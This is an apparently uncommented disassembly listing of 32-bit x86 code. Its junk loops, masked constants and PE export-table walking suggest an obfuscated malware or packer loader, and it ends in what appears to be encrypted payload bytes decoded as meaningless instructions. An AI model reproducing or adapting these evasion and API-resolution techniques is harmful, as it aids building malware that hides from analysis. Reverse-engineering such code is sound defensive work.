  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421942
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423546
  408872:	push   0x4234fe
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421762
  4088d8:	mov    ebx,DWORD PTR ds:0x42178a
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421942
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
  4089b0:	xor    esi,0x0
  4089b3:	cmp    edx,0x70941fd1
  4089b9:	jne    0x408a32
  4089bf:	cmp    esi,0xffffffff
  4089c2:	jne    0x408a32
  4089c8:	mov    edx,DWORD PTR ds:0x4219c6
  4089ce:	mov    esi,DWORD PTR ds:0x4219be
  4089d4:	xor    edx,esi
  4089d6:	mov    DWORD PTR ds:0x4219be,edx
  4089dc:	mov    edx,DWORD PTR [ebp+0xc]
  4089df:	mov    edx,DWORD PTR [edx]
  4089e1:	mov    edx,DWORD PTR [edx]
  4089e3:	mov    esi,DWORD PTR ds:0x4219be
  4089e9:	add    DWORD PTR [edx],esi
  4089eb:	mov    esi,DWORD PTR [ebp+0x8]
  4089ee:	mov    edx,DWORD PTR ds:0x4219be
  4089f4:	xor    esi,0x7510893
  4089fa:	add    esi,0x3272db
  408a00:	xor    ebx,ebx
  408a02:	add    esi,ecx
  408a04:	adc    ebx,0xffffffff
  408a07:	xor    edi,edi
  408a09:	xor    esi,eax
  408a0b:	xor    ebx,0x0
  408a0e:	add    edx,ecx
  408a10:	adc    edi,0xffffffff
  408a13:	xor    edx,eax
  408a15:	xor    edi,0x0
  408a18:	cmp    edx,esi
  408a1a:	jne    0x408a32
  408a20:	cmp    edi,ebx
  408a22:	jne    0x408a32
  408a28:	mov    eax,ds:0x4219be
  408a2d:	mov    ds:0x4219c6,eax
  408a32:	pop    edi
  408a33:	pop    esi
  408a34:	pop    ebx
  408a35:	pop    ebp
  408a36:	ret    0x8
  408a39:	push   ebp
  408a3a:	mov    ebp,esp
  408a3c:	push   ecx
  408a3d:	mov    eax,ds:0x42178e
  408a42:	mov    eax,DWORD PTR [eax]
  408a44:	add    DWORD PTR ds:0x42901c,eax
  408a4a:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  408a51:	mov    eax,DWORD PTR [ebp+0x8]
  408a54:	adc    DWORD PTR ds:0x42a010,0x6bac
  408a5e:	mov    al,BYTE PTR [eax]
  408a60:	xor    DWORD PTR ds:0x42b018,0x428020
  408a6a:	add    al,0xd
  408a6c:	sbb    DWORD PTR ds:0x428004,0x428008
  408a76:	xor    al,0x6f
  408a78:	mov    DWORD PTR ds:0x428004,0x2e21
  408a82:	cmp    al,0x35
  408a84:	mov    DWORD PTR ds:0x42a00c,0x23cb
  408a8e:	jne    0x408b4b
  408a94:	and    DWORD PTR ds:0x428024,0x429014
  408a9e:	mov    eax,DWORD PTR [ebp+0x8]
  408aa1:	dec    edx
  408aa2:	mov    ecx,DWORD PTR [ebp+0x8]
  408aa5:	and    edx,DWORD PTR ds:0x42b010
  408aab:	add    ecx,DWORD PTR [eax+0x3c]
  408aae:	mov    edx,0x7510893
  408ab3:	mov    DWORD PTR [ebp+0x8],ecx
  408ab6:	and    DWORD PTR ds:0x42c008,0x0
  408ac0:	jmp    0x408ad2
  408ac5:	mov    ecx,DWORD PTR ds:0x42c008
  408acb:	inc    ecx
  408acc:	mov    DWORD PTR ds:0x42c008,ecx
  408ad2:	cmp    DWORD PTR ds:0x42c008,0x18
  408ad9:	jae    0x408b1d
  408adf:	cmp    DWORD PTR ds:0x42c008,0x9
  408ae6:	jne    0x408afc
  408aec:	push   0x429014
  408af1:	push   0x5ace
  408af6:	call   DWORD PTR ds:0x42403c
  408afc:	cmp    DWORD PTR ds:0x42c008,0x8
  408b03:	jne    0x408b18
  408b09:	xor    ecx,ecx
  408b0b:	or     ecx,DWORD PTR ds:0x42c008
  408b11:	inc    ecx
  408b12:	mov    DWORD PTR ds:0x42c008,ecx
  408b18:	jmp    0x408ac5
  408b1d:	mov    eax,DWORD PTR [ebp-0x4]
  408b20:	xor    eax,edx
  408b22:	push   esi
  408b23:	mov    esi,DWORD PTR [ebp+0x8]
  408b26:	mov    ecx,0x3272db
  408b2b:	add    eax,ecx
  408b2d:	cmp    DWORD PTR [esi+0x54],eax
  408b30:	pop    esi
  408b31:	je     0x408b3f
  408b37:	mov    eax,DWORD PTR [ebp+0x8]
  408b3a:	jmp    0x408b58
  408b3f:	mov    eax,DWORD PTR [ebp-0x4]
  408b42:	xor    eax,edx
  408b44:	add    eax,ecx
  408b46:	jmp    0x408b58
  408b4b:	mov    eax,DWORD PTR [ebp-0x4]
  408b4e:	xor    eax,0x7510893
  408b53:	add    eax,0x3272db
  408b58:	leave  
  408b59:	ret    0x4
  408b5c:	push   ebp
  408b5d:	mov    ebp,esp
  408b5f:	sub    esp,0x18
  408b62:	and    DWORD PTR ds:0x42901c,0x0
  408b6c:	jmp    0x408b7e
  408b71:	mov    edx,DWORD PTR ds:0x42901c
  408b77:	inc    edx
  408b78:	mov    DWORD PTR ds:0x42901c,edx
  408b7e:	cmp    DWORD PTR ds:0x42901c,0x1a
  408b85:	jae    0x408bb7
  408b8b:	cmp    DWORD PTR ds:0x42901c,0x22
  408b92:	jne    0x408ba8
  408b98:	push   0x8447
  408b9d:	push   0x423554
  408ba2:	call   DWORD PTR ds:0x424040
  408ba8:	jmp    0x408b71
  408bad:	adc    DWORD PTR ds:0x42b010,0x42b00c
  408bb7:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  408bbe:	mov    ecx,DWORD PTR ds:0x42175a
  408bc4:	mov    ecx,DWORD PTR [ecx]
  408bc6:	and    DWORD PTR ds:0x42c01c,ecx
  408bcc:	lea    eax,[ebp+0x14]
  408bcf:	mov    DWORD PTR [ebp-0x4],eax
  408bd2:	push   esi
  408bd3:	and    DWORD PTR ds:0x428018,0x0
  408bdd:	jmp    0x408bef
  408be2:	mov    esi,DWORD PTR ds:0x428018
  408be8:	inc    esi
  408be9:	mov    DWORD PTR ds:0x428018,esi
  408bef:	cmp    DWORD PTR ds:0x428018,0x1a
  408bf6:	jae    0x408cc4
  408bfc:	cmp    DWORD PTR ds:0x428018,0x28
  408c03:	jne    0x408c14
  408c09:	push   0x42356f
  408c0e:	call   DWORD PTR ds:0x424044
  408c14:	jmp    0x408be2
  408c19:	and    DWORD PTR ds:0x42c000,0x0
  408c23:	mov    edx,DWORD PTR ds:0x42c000
  408c29:	inc    edx
  408c2a:	mov    DWORD PTR ds:0x42c000,edx
  408c30:	cmp    DWORD PTR ds:0x42c000,0x20
  408c37:	jne    0x408c52
  408c3d:	push   0x1ea1
  408c42:	push   0x42b008
  408c47:	push   0x423632
  408c4c:	call   DWORD PTR ds:0x424048
  408c52:	cmp    DWORD PTR ds:0x42c000,0x11
  408c59:	jb     0x408c23
  408c5f:	and    DWORD PTR ds:0x42b004,0x0
  408c69:	mov    edx,DWORD PTR ds:0x42b004
  408c6f:	inc    edx
  408c70:	mov    DWORD PTR ds:0x42b004,edx
  408c76:	cmp    DWORD PTR ds:0x42b004,0xf
  408c7d:	jne    0x408c93
  408c83:	push   0x428004
  408c88:	push   0x7cc5
  408c8d:	call   DWORD PTR ds:0x424014
  408c93:	cmp    DWORD PTR ds:0x42b004,0xe
  408c9a:	jne    0x408cad
  408ca0:	mov    edx,DWORD PTR ds:0x42b004
  408ca6:	inc    edx
  408ca7:	mov    DWORD PTR ds:0x42b004,edx
  408cad:	cmp    DWORD PTR ds:0x42b004,0x1d
  408cb4:	jb     0x408c69
  408cba:	mov    DWORD PTR ds:0x428014,0x22a8
  408cc4:	mov    esi,0xf89c85b6
  408cc9:	and    DWORD PTR ds:0x428008,0x0
  408cd3:	mov    edx,DWORD PTR ds:0x428008
  408cd9:	inc    edx
  408cda:	mov    DWORD PTR ds:0x428008,edx
  408ce0:	cmp    DWORD PTR ds:0x428008,0x19
  408ce7:	jne    0x408d17
  408ced:	push   0x62e7
  408cf2:	push   0x428000
  408cf7:	push   0x75f3
  408cfc:	push   0x428000
  408d01:	push   DWORD PTR [ebp-0x24]
  408d04:	push   0x6458
  408d09:	push   DWORD PTR [ebp-0x14]
  408d0c:	push   0x5743
  408d11:	call   DWORD PTR ds:0x424018
  408d17:	cmp    DWORD PTR ds:0x428008,0x14
  408d1e:	jb     0x408cd3
  408d24:	xor    ecx,ecx
  408d26:	add    ecx,DWORD PTR ds:0x429008
  408d2c:	adc    DWORD PTR ds:0x42c00c,ecx
  408d32:	mov    DWORD PTR [ebp-0xc],esi
  408d35:	lea    eax,[ebp-0xc]
  408d38:	dec    ecx
  408d39:	mov    DWORD PTR [ebp-0x14],eax
  408d3c:	mov    eax,DWORD PTR [ebp-0xc]
  408d3f:	adc    ecx,0x29e6
  408d45:	mov    edx,DWORD PTR [ebp-0x14]
  408d48:	and    DWORD PTR ds:0x428018,0x0
  408d52:	mov    ecx,DWORD PTR ds:0x428018
  408d58:	inc    ecx
  408d59:	mov    DWORD PTR ds:0x428018,ecx
  408d5f:	cmp    DWORD PTR ds:0x428018,0xb
  408d66:	jne    0x408d77
  408d6c:	push   0x4faf
  408d71:	call   DWORD PTR ds:0x42401c
  408d77:	cmp    DWORD PTR ds:0x428018,0xa
  408d7e:	jne    0x408d91
  408d84:	mov    ecx,DWORD PTR ds:0x428018
  408d8a:	inc    ecx
  408d8b:	mov    DWORD PTR ds:0x428018,ecx
  408d91:	cmp    DWORD PTR ds:0x428018,0x1e
  408d98:	jb     0x408d52
  408d9e:	inc    ecx
  408d9f:	mov    ecx,0x7510893
  408da4:	neg    DWORD PTR ds:0x42a004
  408daa:	xor    eax,ecx
  408dac:	add    eax,0x3272db
  408db1:	and    DWORD PTR ds:0x42c010,0x2759
  408dbb:	mov    DWORD PTR [edx],eax
  408dbd:	mov    edx,DWORD PTR ds:0x421752
  408dc3:	mov    eax,ds:0x421762
  408dc8:	sub    edx,eax
  408dca:	and    edx,DWORD PTR [edx+eax*1]
  408dcd:	mov    eax,ds:0x4217ba
  408dd2:	inc    DWORD PTR ds:0x42a01c
  408dd8:	mov    edx,DWORD PTR [ebp-0x4]
  408ddb:	and    DWORD PTR ds:0x42a018,0x7b9c
  408de5:	mov    eax,DWORD PTR [eax]
  408de7:	and    DWORD PTR ds:0x42c000,0x5f81
  408df1:	add    eax,DWORD PTR [edx]
  408df3:	movzx  edx,BYTE PTR ds:0x42a014
  408dfa:	or     DWORD PTR ds:0x42a01c,edx
  408e00:	push   edi
  408e01:	add    DWORD PTR ds:0x42a004,edx
  408e07:	mov    DWORD PTR [ebp-0x8],eax
  408e0a:	movzx  edx,WORD PTR ds:0x428004
  408e11:	sbb    DWORD PTR ds:0x42a01c,edx
  408e17:	mov    edi,DWORD PTR [ebp+0x8]
  408e1a:	and    DWORD PTR ds:0x42b01c,0x631e
  408e24:	mov    eax,ds:0x421942
  408e29:	mov    eax,DWORD PTR [eax+0x198]
  408e2f:	xor    edi,ecx
  408e31:	mov    DWORD PTR ds:0x428018,0x14
  408e3b:	cmp    DWORD PTR ds:0x428018,0x0
  408e42:	je     0x408e95
  408e48:	cmp    DWORD PTR ds:0x428018,0x3
  408e4f:	jne    0x408e63
  408e55:	push   DWORD PTR [ebp-0x28]
  408e58:	push   0x77dc
  408e5d:	call   DWORD PTR ds:0x424020
  408e63:	cmp    DWORD PTR ds:0x428018,0x4
  408e6a:	jne    0x408e7d
  408e70:	mov    edx,DWORD PTR ds:0x428018
  408e76:	dec    edx
  408e77:	mov    DWORD PTR ds:0x428018,edx
  408e7d:	mov    edx,DWORD PTR ds:0x428018
  408e83:	dec    edx
  408e84:	mov    DWORD PTR ds:0x428018,edx
  408e8a:	jmp    0x408e3b
  408e8f:	and    DWORD PTR ds:0x42c014,ecx
  408e95:	mov    edx,0x3272db
  408e9a:	sbb    DWORD PTR ds:0x429008,0x451c
  408ea4:	add    edi,edx
  408ea6:	mov    DWORD PTR ds:0x42a000,0x2432
  408eb0:	cmp    DWORD PTR [eax],edi
  408eb2:	je     0x408ebf
  408eb8:	mov    eax,DWORD PTR [eax]
  408eba:	jmp    0x409144
  408ebf:	mov    eax,DWORD PTR [ebp+0x18]
  408ec2:	cmp    eax,esi
  408ec4:	jne    0x408ede
  408eca:	mov    DWORD PTR ds:0x42a01c,0x2296
  408ed4:	push   0xf89c85b5
  408ed9:	jmp    0x409133
  408ede:	mov    esi,DWORD PTR [ebp+0x18]
  408ee1:	mov    eax,0x2f4e
  408ee6:	mov    eax,0xf89c85b4
  408eeb:	cmp    esi,eax
  408eed:	jne    0x409123
  408ef3:	sbb    esi,esi
  408ef5:	mov    eax,DWORD PTR [ebp+0x10]
  408ef8:	mov    esi,DWORD PTR ds:0x42c008
  408efe:	sbb    esi,DWORD PTR ds:0x42a008
  408f04:	mov    DWORD PTR ds:0x42c008,esi
  408f0a:	xor    eax,ecx
  408f0c:	mov    DWORD PTR ds:0x428000,0x1b
  408f16:	cmp    DWORD PTR ds:0x428000,0x0
  408f1d:	je     0x408f86
  408f23:	cmp    DWORD PTR ds:0x428000,0x4
  408f2a:	jne    0x408f5a
  408f30:	push   0x42a000
  408f35:	push   0x8ffd
  408f3a:	push   DWORD PTR [ebp-0x14]
  408f3d:	push   0x428014
  408f42:	push   0x2d9f
  408f47:	push   0x4236ac
  408f4c:	push   0x4cf3
  408f51:	push   DWORD PTR [ebp-0x1c]
  408f54:	call   DWORD PTR ds:0x424024
  408f5a:	cmp    DWORD PTR ds:0x428000,0x5
  408f61:	jne    0x408f74
  408f67:	mov    esi,DWORD PTR ds:0x428000
  408f6d:	dec    esi
  408f6e:	mov    DWORD PTR ds:0x428000,esi
  408f74:	mov    esi,DWORD PTR ds:0x428000
  408f7a:	dec    esi
  408f7b:	mov    DWORD PTR ds:0x428000,esi
  408f81:	jmp    0x408f16
  408f86:	add    eax,edx
  408f88:	mov    DWORD PTR [ebp-0x18],eax
  408f8b:	mov    eax,DWORD PTR [ebp+0xc]
  408f8e:	mov    esi,DWORD PTR [ebp-0x8]
  408f91:	xor    eax,ecx
  408f93:	add    eax,edx
  408f95:	imul   eax,DWORD PTR [esi]
  408f98:	mov    esi,DWORD PTR [ebp+0x8]
  408f9b:	xor    esi,ecx
  408f9d:	add    esi,edx
  408f9f:	cmp    esi,eax
  408fa1:	mov    eax,DWORD PTR [ebp-0x4]
  408fa4:	push   ebx
  408fa5:	je     0x408fc4
  408fab:	mov    esi,DWORD PTR [ebp-0x18]
  408fae:	add    DWORD PTR [eax],esi
  408fb0:	mov    eax,DWORD PTR [ebp-0x4]
  408fb3:	mov    esi,DWORD PTR [ebp+0xc]
  408fb6:	xor    esi,ecx
  408fb8:	add    esi,edx
  408fba:	imul   esi,DWORD PTR [eax]
  408fbd:	mov    DWORD PTR [eax],esi
  408fbf:	jmp    0x408fc9
  408fc4:	mov    esi,DWORD PTR [ebp+0x14]
  408fc7:	xor    DWORD PTR [eax],esi
  408fc9:	mov    eax,DWORD PTR [ebp-0x4]
  408fcc:	mov    edi,DWORD PTR [ebp+0x10]
  408fcf:	xor    edi,ecx
  408fd1:	mov    esi,0xffcd8d25
  408fd6:	mov    ebx,esi
  408fd8:	sub    ebx,edi
  408fda:	add    DWORD PTR [eax],ebx
  408fdc:	mov    eax,DWORD PTR [ebp-0x4]
  408fdf:	mov    edi,DWORD PTR [ebp-0x8]
  408fe2:	add    edi,DWORD PTR [eax]
  408fe4:	mov    DWORD PTR [ebp-0x8],edi
  408fe7:	mov    eax,DWORD PTR [ebp+0xc]
  408fea:	mov    edi,DWORD PTR [ebp+0xc]
  408fed:	xor    edi,ecx
  408fef:	xor    eax,ecx
  408ff1:	lea    eax,[eax+edi*1+0x64e5b6]
  408ff8:	mov    edi,DWORD PTR [ebp+0xc]
  408ffb:	xor    edi,ecx
  408ffd:	add    edi,edx
  408fff:	imul   eax,edi
  409002:	mov    edi,DWORD PTR [ebp+0xc]
  409005:	xor    edi,ecx
  409007:	sub    edi,eax
  409009:	mov    eax,DWORD PTR [ebp-0x4]
  40900c:	add    edi,edx
  40900e:	cmp    DWORD PTR [eax],edi
  409010:	mov    eax,DWORD PTR [ebp-0x4]
  409013:	mov    edi,DWORD PTR [ebp+0x10]
  409016:	jg     0x409029
  40901c:	xor    edi,ecx
  40901e:	mov    ebx,esi
  409020:	sub    ebx,edi
  409022:	add    DWORD PTR [eax],ebx
  409024:	jmp    0x40902f
  409029:	xor    edi,ecx
  40902b:	add    edi,edx
  40902d:	add    DWORD PTR [eax],edi
  40902f:	mov    eax,DWORD PTR [ebp-0x8]
  409032:	mov    edi,DWORD PTR [ebp-0x10]
  409035:	mov    eax,DWORD PTR [eax]
  409037:	xor    edi,ecx
  409039:	add    edi,0x3272da
  40903f:	not    edi
  409041:	and    eax,edi
  409043:	movsx  di,BYTE PTR [eax+0x1]
  409048:	mov    ebx,0x3b4b
  40904d:	sub    di,bx
  409050:	mov    ebx,0x8a85
  409055:	xor    di,bx
  409058:	mov    ebx,0x4f8a
  40905d:	cmp    di,bx
  409060:	jne    0x409088
  409066:	movsx  di,BYTE PTR [eax]
  40906a:	mov    ebx,0x3b4b
  40906f:	sub    di,bx
  409072:	mov    ebx,0x8a85
  409077:	xor    di,bx
  40907a:	mov    ebx,0x4f87
  40907f:	cmp    di,bx
  409082:	je     0x409098
  409088:	mov    edi,DWORD PTR [ebp-0x10]
  40908b:	xor    edi,ecx
  40908d:	mov    ebx,esi
  40908f:	sub    ebx,edi
  409091:	add    eax,ebx
  409093:	jmp    0x409043
  409098:	mov    esi,DWORD PTR [ebp-0x14]
  40909b:	mov    esi,DWORD PTR [esi]
  40909d:	mov    edi,DWORD PTR [eax+0x3c]
  4090a0:	lea    esi,[edi+esi*8+0x78]
  4090a4:	mov    esi,DWORD PTR [esi+eax*1]
  4090a7:	mov    DWORD PTR [ebp-0x8],esi
  4090aa:	mov    esi,DWORD PTR [ebp+0x8]
  4090ad:	xor    esi,ecx
  4090af:	add    esi,edx
  4090b1:	mov    DWORD PTR [ebp-0x14],esi
  4090b4:	mov    esi,DWORD PTR [ebp+0x8]
  4090b7:	mov    edi,DWORD PTR [ebp-0x8]
  4090ba:	xor    esi,ecx
  4090bc:	add    esi,edx
  4090be:	pop    ebx
  4090bf:	cmp    edi,esi
  4090c1:	jne    0x4090df
  4090c7:	mov    eax,DWORD PTR [ebp+0xc]
  4090ca:	xor    eax,ecx
  4090cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4090cf:	add    eax,edx
  4090d1:	imul   eax,ecx
  4090d4:	mov    DWORD PTR [ebp-0x8],eax
  4090d7:	push   DWORD PTR [ebp+0x18]
  4090da:	jmp    0x409133
  4090df:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e2:	add    ecx,eax
  4090e4:	mov    DWORD PTR [ebp-0x14],ecx
  4090e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4090ea:	mov    ecx,DWORD PTR [ecx+0xc]
  4090ed:	movsx  cx,BYTE PTR [ecx+eax*1]
  4090f2:	mov    edx,0x3b4b
  4090f7:	sub    cx,dx
  4090fa:	mov    edx,0x8a85
  4090ff:	xor    cx,dx
  409102:	mov    edx,0x4f85
  409107:	cmp    cx,dx
  40910a:	jne    0x4090d7
  409110:	mov    ecx,DWORD PTR ds:0x421942
  409116:	mov    ecx,DWORD PTR [ecx+0x198]
  40911c:	mov    DWORD PTR [ecx],eax
  40911e:	jmp    0x409144
  409123:	mov    ecx,DWORD PTR [ebp+0x18]
  409126:	cmp    ecx,0xf89c85b5
  40912c:	jne    0x409144
  409132:	push   eax
  409133:	push   DWORD PTR [ebp+0x14]
  409136:	push   DWORD PTR [ebp+0x10]
  409139:	push   DWORD PTR [ebp+0xc]
  40913c:	push   DWORD PTR [ebp+0x8]
  40913f:	call   0x408b5c
  409144:	pop    edi
  409145:	pop    esi
  409146:	leave  
  409147:	ret    0x14
  40914a:	push   ebp
  40914b:	mov    ebp,esp
  40914d:	push   ecx
  40914e:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  409155:	mov    eax,DWORD PTR [ebp-0x4]
  409158:	mov    ecx,DWORD PTR ds:0x42b010
  40915e:	sbb    DWORD PTR ds:0x42a018,ecx
  409164:	mov    edx,DWORD PTR [ebp+0x10]
  409167:	mov    DWORD PTR ds:0x42801c,0x4950
  409171:	mov    ecx,0x7510893
  409176:	sbb    DWORD PTR ds:0x428028,0x4a48
  409180:	xor    eax,ecx
  409182:	add    DWORD PTR ds:0x42b000,0x42800c
  40918c:	add    eax,0x3272db
  409191:	mov    DWORD PTR ds:0x42a014,0x169
  40919b:	mov    DWORD PTR [edx],eax
  40919d:	sbb    eax,edx
  40919f:	mov    eax,DWORD PTR [ebp+0xc]
  4091a2:	xor    eax,ecx
  4091a4:	inc    edx
  4091a5:	push   esi
  4091a6:	xor    esi,edx
  4091a8:	mov    esi,DWORD PTR [ebp+0x10]
  4091ab:	mov    edx,0x3272db
  4091b0:	add    eax,edx
  4091b2:	add    DWORD PTR ds:0x42b01c,0x428020
  4091bc:	mov    DWORD PTR [esi+0x4],eax
  4091bf:	mov    eax,DWORD PTR [ebp+0x14]
  4091c2:	mov    esi,DWORD PTR ds:0x428024
  4091c8:	sbb    esi,DWORD PTR ds:0x429010
  4091ce:	mov    DWORD PTR ds:0x428024,esi
  4091d4:	mov    esi,DWORD PTR [ebp+0x10]
  4091d7:	mov    DWORD PTR [esi+0x8],eax
  4091da:	mov    eax,DWORD PTR [ebp+0x18]
  4091dd:	mov    esi,DWORD PTR [ebp+0x10]
  4091e0:	mov    DWORD PTR [esi+0xc],eax
  4091e3:	mov    eax,DWORD PTR [ebp+0x1c]
  4091e6:	mov    esi,DWORD PTR [ebp+0x10]
  4091e9:	mov    DWORD PTR [esi+0x10],eax
  4091ec:	mov    eax,DWORD PTR [ebp+0x8]
  4091ef:	xor    eax,ecx
  4091f1:	add    eax,edx
  4091f3:	pop    esi
  4091f4:	leave  
  4091f5:	ret    0x18
  4091f8:	push   ebp
  4091f9:	mov    ebp,esp
  4091fb:	sub    esp,0x94
  409201:	mov    eax,DWORD PTR [ebp+0x8]
  409204:	push   ebx
  409205:	neg    ecx
  409207:	jmp    0x40b57c
  40920c:	mov    dl,0xcf
  40920e:	enter  0x872f,0x27
  409212:	imul   ebp,DWORD PTR [edi+0x65],0xb9d7ebdc
  409219:	xchg   edi,eax
  40921a:	retf   
  40921b:	mov    eax,0x626218a7
  409220:	or     bl,BYTE PTR [edi+0x62]
  409223:	bound  ebp,QWORD PTR [ebx-0x4d]
  409226:	ja     0x409282
  409228:	sbb    DWORD PTR [eax+eiz*1],esi
  40922b:	retf   0x57dc
  40922e:	test   DWORD PTR [edi+0x14],0xa163bd46
  409235:	aad    0x25
  409237:	mov    cl,0xd9
  409239:	mov    ecx,0x8b8ef107
  40923e:	pusha  
  40923f:	mov    BYTE PTR [eax+0x6a],bh
  409242:	ret    
  409243:	test   DWORD PTR [esp+edi*2+0x6b],0x83ccdc91
  40924b:	je     0x4092a1
  40924d:	in     al,0x7b
  40924f:	dec    esi
  409250:	adc    BYTE PTR ds:0xe0c71eba,dl
  409256:	inc    edx
  409257:	sahf   
  409258:	or     al,0x2a
  40925a:	add    bl,dh
  40925c:	mov    edi,0x2a01da8
  409261:	icebp  
  409262:	rcl    bl,cl
  409264:	xchg   BYTE PTR ds:0xf51ef9d5,cl
  40926a:	pop    ss
  40926b:	dec    edi
  40926c:	or     DWORD PTR [esi],eax
  40926e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926f:	or     DWORD PTR [edi+0x1033e4b0],0xc771a9df
  409279:	xchg   ecx,eax
  40927a:	adc    DWORD PTR [ebp+0x10d303c9],edi
  409280:	mov    ch,0x77
  409282:	cmc    
  409283:	fidiv  WORD PTR [ecx-0x2dcd2fde]
  409289:	mov    esi,0x9dab690e
  40928e:	sbb    BYTE PTR [edi+0x71],ch
  409291:	xchg   esi,eax
  409292:	or     eax,0xe106236d
  409297:	cmp    eax,ecx
  409299:	xchg   ebx,eax
  40929a:	loope  0x4092e7
  40929c:	mov    ebx,0xc06b87aa
  4092a1:	ficom  DWORD PTR [esi+eiz*2+0x41dbbb71]
  4092a8:	push   0x14058086
  4092ad:	jns    0x4092f6
  4092af:	mov    ch,0xac
  4092b1:	lods   al,BYTE PTR ds:[esi]
  4092b2:	xchg   esi,eax
  4092b3:	outs   dx,BYTE PTR ds:[esi]
  4092b4:	inc    eax
  4092b5:	mov    cl,0xa9
  4092b7:	xchg   esp,eax
  4092b8:	scas   eax,DWORD PTR es:[edi]
  4092b9:	xchg   ebp,eax
  4092ba:	pop    esi
  4092bb:	xlat   BYTE PTR ds:[ebx]
  4092bc:	dec    ebp
  4092bd:	stos   DWORD PTR es:[edi],eax
  4092be:	push   ecx
  4092bf:	xor    DWORD PTR [eax],esi
  4092c1:	mov    dl,0x8a
  4092c3:	sub    eax,0xfe30d3d5
  4092c8:	clc    
  4092c9:	lods   eax,DWORD PTR ds:[esi]
  4092ca:	mov    eax,ds:0x6531d2bc
  4092cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092d0:	and    esp,0x3
  4092d3:	rol    BYTE PTR [edx+0x1a],cl
  4092d6:	and    al,BYTE PTR [esi-0x3d47740e]
  4092dc:	int3   
  4092dd:	data16 mov cl,0x29
  4092e0:	mov    WORD PTR [eax],es
  4092e2:	sbb    eax,0xf2b72060
  4092e7:	mov    dh,0x3a
  4092e9:	test   BYTE PTR [edx+0x6592d9f3],dh
  4092ef:	test   eax,0x1e150951
  4092f4:	mov    ds:0x7c4d5be9,al
  4092f9:	adc    esi,ecx
  4092fb:	into   
  4092fc:	addr16 jmp 0x40932d
  4092ff:	and    DWORD PTR [ebp+0x6ea2b4b7],0xffffffa0
  409306:	push   edi
  409307:	fild   QWORD PTR [edx+0x55e6c9b2]
  40930d:	cs ds loopne 0x409351
  409311:	jno    0x409388
  409313:	jno    0x409324
  409315:	lds    edi,FWORD PTR [edi-0x42eb39d2]
  40931b:	sbb    BYTE PTR [ebx-0x23800420],0xcf
  409322:	fisubr DWORD PTR [ecx]
  409324:	xchg   edx,eax
  409325:	jge    0x4092be
  409327:	lahf   
  409328:	xor    DWORD PTR [edi+0x6],ebx
  40932b:	or     esp,DWORD PTR [esp]
  40932e:	stos   BYTE PTR es:[edi],al
